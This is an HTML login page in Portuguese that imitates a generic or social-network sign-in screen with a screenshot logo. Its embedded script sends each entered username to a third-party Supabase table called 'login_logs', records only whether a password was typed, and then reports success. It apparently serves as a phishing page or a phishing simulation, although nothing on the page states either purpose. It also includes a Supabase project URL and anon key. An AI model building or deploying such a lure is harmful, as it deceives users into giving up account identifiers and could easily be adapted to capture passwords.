<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Entrar</title>

  <link rel="icon" href="favicon.ico" type="image/x-icon">

  <style>
    * {
      box-sizing: border-box;
      font-family: system-ui, -apple-system, BlinkMacSystemFont,
        "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 320px;
      padding: 30px;
      text-align: center;
    }

    .logo {
      margin-bottom: 25px;
    }

    .logo img {
      max-width: 180px;
      height: auto;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #4cb5f9;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- LOGO -->
    <div class="logo">
      <img
        src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png"
        alt="Logo"
      />
    </div>

    <!-- FORM -->
    <form id="form">
      <input
        id="usuario"
        type="text"
        placeholder="UsuÃ¡rio"
        required
      />
      <input
        id="senha"
        type="password"
        placeholder="Senha"
        required
      />
      <button type="submit">Entrar</button>
    </form>
  </div>

  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";

    const supabaseClient = supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    document.getElementById("form").addEventListener("submit", async (e) => {
      e.preventDefault();

      const usuario = document.getElementById("usuario").value;
      const senhaInput = document.getElementById("senha").value;

      const { error } = await supabaseClient
        .from("login_logs")
        .insert({
          usuario: usuario,
          senha: senhaInput ? "preenchida" : "vazia"
        });

      if (error) {
        alert("Erro: " + error.message);
        return;
      }

      alert("Enviado com sucesso");
    });
  </script>
</body>
</html>
